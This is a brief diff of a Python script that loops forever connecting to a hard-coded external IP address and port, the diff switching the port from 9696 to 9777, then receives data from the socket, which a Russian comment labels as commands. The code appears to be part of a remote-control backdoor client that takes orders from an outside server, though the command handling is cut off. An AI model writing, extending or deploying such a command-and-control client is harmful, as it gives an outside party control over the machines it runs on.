@@ -5,7 +5,7 @@ import wget
 while True:
     try:
         sock = socket.socket()
-        sock.connect(("109.169.239.111", 9696))
+        sock.connect(("109.169.239.111", 9777))
         while True:
             try:
                 data = sock.recv(1024).decode()  # получаем команду
